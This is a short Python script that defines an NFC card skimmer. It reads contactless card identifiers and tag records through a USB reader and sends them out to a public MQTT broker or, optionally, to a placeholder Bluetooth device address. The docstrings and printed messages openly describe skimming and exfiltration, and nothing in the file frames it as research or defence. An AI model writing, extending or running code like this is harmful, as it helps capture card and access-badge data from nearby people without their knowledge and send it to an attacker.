import nfc
import time
import paho.mqtt.client as mqtt

class PassiveNFCLogger:
    def __init__(self, device='usb', exfiltration_mode="mqtt"):
        self.device = device
        self.mqtt_client = mqtt.Client()
        self.exfiltration_mode = exfiltration_mode

        if exfiltration_mode == "mqtt":
            self.mqtt_client.connect("broker.hivemq.com", 1883)
            self.mqtt_client.loop_start()

    def sniff_traffic(self):
        """Continuously sniff NFC transactions and exfiltrate data"""
        with nfc.ContactlessFrontend(self.device) as clf:
            print("Passive NFC skimming activated...")
            clf.connect(rdwr={
                "on-connect": self._process_tag
            })

    def _process_tag(self, tag):
        """Extract card UID + APDUs and send to remote server"""
        card_uid = tag.identifier.hex()
        tag_data = {
            "uid": card_uid,
            "atc": tag.ndef.records if hasattr(tag, "ndef") else None
        }

        print(f"Captured card UID: {card_uid}")

        if self.exfiltration_mode == "mqtt":
            self.mqtt_client.publish("nfc/data", str(tag_data))
        elif self.exfiltration_mode == "bluetooth":
            self._send_bluetooth(tag_data)

    def _send_bluetooth(self, tag_data):
        """Send captured data via Bluetooth"""
        import bluetooth
        bt_socket = bluetooth.BluetoothSocket(bluetooth.RFCOMM)
        bt_socket.connect(("XX:XX:XX:XX:XX:XX", 1))  # Replace with remote device MAC
        bt_socket.send(str(tag_data))
        bt_socket.close()
